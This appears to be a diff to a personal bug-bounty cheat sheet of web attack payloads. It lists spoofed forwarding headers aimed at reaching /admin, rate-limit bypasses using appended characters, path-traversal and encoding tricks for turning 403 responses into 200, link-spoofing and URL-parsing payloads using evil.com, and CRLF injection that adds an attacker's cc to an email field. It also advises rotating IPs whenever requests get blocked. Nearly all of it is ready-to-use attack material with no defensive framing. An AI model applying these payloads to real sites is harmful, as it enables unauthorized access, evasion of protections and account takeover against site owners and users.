@@ -1,5 +1,5 @@
-X-Forwarded-Host: testing-now.000webhostapp.com/.newrelic.com
-X-Forwarded-Host: attack.com/host.com
+X-Forwarded-Host: testing-now.000webhostapp.com/.amino.com
+X-Forwarded-Host: attack.com/amino.com
 Host: example.com?.mavenlink.com
 X-Original-URL:/admin
 X-Originating-Ip:127.0.0.1
@@ -7,3 +7,45 @@ X-Remote-Ip:127.0.0.1
 X-Remote-Addr:127.0.0.1
 X-Client-Ip:127.0.0.1
 X-Forwarded-proto:/admin
+X-Forwarded-For: 127.0.0.1
+X-Host: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Real-IP:127.0.0.1
+X-Rewrite-URL:/admin
+...CHANGE THE IP WHEN EVER REQUEST GETS  BLOCKED AGAIN
+
+
+--->Add space after email
+
+--->Add the characters %00,%09,%20,%2e,%0d,%0a after email or phone number (ratelimit)
+
+--->use space symbols like /admin%20,/admin%09 (bypass 403)
+
+--->traversal tricks----   /admin/..;/   (bypass 403)
+                           /static../admin.jsp
+      site.com/secret –> HTTP 403 Forbidden
+      site.com/secret/ –> HTTP 200 OK
+      site.com/secret/. –> HTTP 200 OK
+      site.com//secret// –> HTTP 200 OK
+      site.com/./secret/.. –> HTTP 200 OK
+
+--->use post //admin and Host:target to google.com (bypass 403)
+     
+        https://target.com/admin/ –> HTTP 302 (redirect to login page)
+        https://target.com/admin..;/ –> HTTP 200 OK
+
+	https://target.com/../admin
+        https://target.com/whatever/..;/admin
+
+--->use %2e in btw url(bypass 403)
+
+-->Add +<url> for spoofing attacks
+Ex:
+Content-Disposition: form-data; name="text"
+
+-http://example.com
++<http://evil.com|http://example.com>
+
+--->TRY \n\n@ at end "url":"https://example.com\n\n\n\n\n@evil.com"
+
+--->Intercept request and put email:victim mail%0d%0acc:hacker-mail-id
